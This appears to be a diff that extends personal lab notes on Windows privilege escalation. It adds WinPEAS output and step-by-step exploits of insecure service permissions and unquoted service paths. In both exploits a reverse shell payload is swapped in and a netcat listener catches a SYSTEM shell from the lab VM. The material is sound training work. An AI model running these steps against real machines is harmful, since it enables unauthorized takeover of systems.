@@ -26,7 +26,7 @@ Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
 [*] Closing down connection (192.168.37.131,50230)
 [*] Remaining connections []
 ```
-3. [Log in as : `IEUser`]In windows machine open Powershell(run as administartor)
+3. [Log in as : `user`]In windows machine open Powershell(run as administartor)
 4. start the smb server 
 
     ```powershell
@@ -173,6 +173,50 @@ net localgroup administrators <username> /add
 - While it is always important to understand what tools are doing, they are valuable in a time-limited setting, such as exam.
 - We will use mostly,  `WinPEAS` and Seatbelt.
 
+- Command used
+```bash
+C:\PrivEsc .\winPEASAny.exe quiet servicesinfo
+```
+- Sample winpeas output
+```bash
+──(kali㉿kali)-[~/windows-priv-esc]
+└─$ cat servicesinfo.txt           
+   Creating Dynamic lists, this could take a while, please wait...
+   - Checking if domain...
+   - Getting Win32_UserAccount info...
+   - Creating current user groups list...
+   - Creating active users list...
+   - Creating disabled users list...
+   - Admin users list...
+  WinPEAS vBETA VERSION, Please if you find any issue let me know in https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues by carlospolop
+
+  [+] Leyend:
+         Red                Indicates a special privilege over an object or something is misconfigured
+         Green              Indicates that some protection is enabled or something is well configured
+         Cyan               Indicates active users
+         Blue               Indicates disabled users
+         LightYellow        Indicates links
+
+   [?] You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
+
+
+  ========================================(Services Information)========================================
+
+  [+] Interesting Services -non Microsoft-(T1007)
+   [?] Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#services                                                                                                                                                                                             
+    daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
+    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles
+   =================================================================================================
+
+    dllsvc(DLL Hijack Service)["C:\Program Files\DLL Hijack Service\dllhijackservice.exe"] - Manual - Stopped
+   =================================================================================================
+
+    filepermsvc(File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
+    File Permissions: Everyone [AllAccess]
+   =================================================================================================
+
+
+```
 ### 5.2 Admin -> System
 
 To escalate from and admin user to full SYSTEM privileges, we can uise the `PsExec` tool from Windows Sysinternals
@@ -248,14 +292,212 @@ sc.exe config <name> <option>= <value>  # note space after option
 net start/stop  <name>
 ```
 
-### 7.1 
+### 7.1  Insecure service permissions
 
-__Insecure service permissions__
+
 - Each service has an ACL which defines certain servcie-specific permissions.
 - Some permissions are innocuos(e.g `SERVICE_QUERY_CONFIG`, `SERVICE_QUERY_STATUS`).
 - Some may be useful (e.g `SERVICE_STOP`, `SERVICE_START`).
 - Some are dangerous(e.g. `SERVICE_CHANGE_CONFIG`, `SERVICE_ALL_ACCESS`).
+
+
+ - If our user has permission to change the configuration of a service which runs with `SYSTEM` privileges, we can change the executable, the service uses to one of our own.
+
+ - __Potential rabbit hole :__ If you can change a service configuration but cannot stop/start the service, you may not be able to escalate privileges!.
  
+
+- Exploiting `daclsvc` service from `winpeas` output. (Can be seen in modifiable services)
+- verify this with `accesschck`
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uwcqv user daclsvc
+RW daclsvc
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_CHANGE_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+|  Parameter | Description   |  
+|---|---|
+|  u | suppress errors   |  
+| w  | Show only objects that have write access  |  
+| c  |  Name is a Windows Service, e.g. `ssdpsrv`. Specify "*" as the name to show all services and `scmanager` to check the security of the Service Control Manager. |
+|q|Omit Banner|
+|v|Verbose (includes Windows Vista Integrity Level)|
+
+More can be found here: https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk
+
+- We now know we can change `SERVICE_CHANGE_CONFIG` service configuration as well as start and stop service (`SERVICE_START`, `SERVICE_STOP`).
+- We can query what it can do, using
+
+```bash
+C:\PrivEsc>sc qc daclsvc
+[SC] QueryServiceConfig SUCCESS
+
+SERVICE_NAME: daclsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        START_TYPE         : 3   DEMAND_START
+        ERROR_CONTROL      : 1   NORMAL
+        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"
+        LOAD_ORDER_GROUP   :
+        TAG                : 0
+        DISPLAY_NAME       : DACL Service
+        DEPENDENCIES       :
+        SERVICE_START_NAME : LocalSystem
+```
+
+-  `DEMAND_START` - need to start manually.
+-  `LocalSystem` - runs with System permissions.
+
+- We can check the current state of this service
+```bash
+C:\PrivEsc>sc query daclsvc
+
+SERVICE_NAME: daclsvc
+        TYPE               : 10  WIN32_OWN_PROCESS
+        STATE              : 1  STOPPED  # current state is stopped
+        WIN32_EXIT_CODE    : 0  (0x0)
+        SERVICE_EXIT_CODE  : 0  (0x0)
+        CHECKPOINT         : 0x0
+        WAIT_HINT          : 0x7d0
+```
+
+- We have write permissions, we can change the binary path of the service to our reverse shell payload.
+
+```bash
+C:\PrivEsc>sc config daclsvc binpath= "\"C:\PrivEsc\reverse_9001.exe\""
+[SC] ChangeServiceConfig SUCCESS
+```
+
+- We can now start the servie (make sure `netcat` is listening to the reverse shell)
+- To start the service
+```bash
+C:\PrivEsc>net start daclsvc
+```
+
+```bash
+┌──(kali㉿kali)-[~/windows-priv-esc]
+└─$ sudo nc -lvnp  9001
+[sudo] password for kali: 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 51947
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami
+whoami
+nt authority\system
+```
+
+### 7.1  Unquoted Service path
+
+- Executables in windows can be run without using their extensions (e.g. `whoami.exe` can be run as `whoami`)..
+- Some executables take arguments, seperated by spaces e.g. `someprogram.exe arg1 arg2 ..`
+
+- This behavior leads to ambiguity when using absolute paths that are unquoted and contain spaces.
+
+- Consider the following unquoted path
+
+```bash
+C:\Program Files\Some Dir\Someprogram.exe
+```
+- It seems to run `Someprograme.exe`, but to windows `C:\program` could be executable, with two arguments: `Files\Some` and `Dir\Someprograme.exe`
+- Windows resolves this ambiguity by checking each possibilities in turn.
+- If we can write to a location, windows checks before the acvtual executable, we can trick the service into executing it instead.
+
+__Winpeas output__
+```bash
+ ===========================================                                                                                       
+
+unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected
+============================================================
+```
+- Check whether we have permission to start the service
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -ucqv unquotedsvc
+unquotedsvc
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT AUTHORITY\SYSTEM
+        SERVICE_ALL_ACCESS
+  RW BUILTIN\Administrators
+        SERVICE_ALL_ACCESS
+  R  Everyone
+        SERVICE_QUERY_STATUS
+        SERVICE_QUERY_CONFIG
+        SERVICE_INTERROGATE
+        SERVICE_ENUMERATE_DEPENDENTS
+        SERVICE_START
+        SERVICE_STOP
+        READ_CONTROL
+```
+
+- Now check write permissions in each existing directory
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uwdq C:\
+C:\
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Administrators
+  RW NT AUTHORITY\SYSTEM
+```
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:\Program Files"
+C:\Program Files
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+```
+
+```bash
+C:\PrivEsc>.\accesschk.exe /accepteula -uwdq "C:\Program Files\Unquoted Path Service"
+C:\Program Files\Unquoted Path Service
+  Medium Mandatory Level (Default) [No-Write-Up]
+  RW BUILTIN\Users
+  RW NT SERVICE\TrustedInstaller
+  RW NT AUTHORITY\SYSTEM
+  RW BUILTIN\Administrators
+```
+
+- Found a directroy `"C:\Program Files\Unquoted Path Service"` where we have write permissions.
+
+- Now copy the `reverse_shell` to the directory and name it as `common.exe`
+
+```bash
+C:\PrivEsc>copy reverse_9001.exe "C:\Program Files\Unquoted Path Service\common.exe"
+        1 file(s) copied.
+```
+
+- Start the listener and start the service
+- Starting the service
+```bash
+net start unquotedsvc
+```
+__Result__
+
+```bash
+┌──(kali㉿kali)-[~/windows-priv-esc]
+└─$ sudo nc -lvnp  9001 
+listening on [any] 9001 ...
+connect to [192.168.37.128] from (UNKNOWN) [192.168.37.134] 52140
+Microsoft Windows [Version 10.0.17763.379]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32>whoami 
+whoami
+nt authority\system
+
+```
+
+### 7.3 Weak Registry Permissions
+
 
 
 <br><br/><br><br/><br><br/><br><br/><br><br/><br><br/>
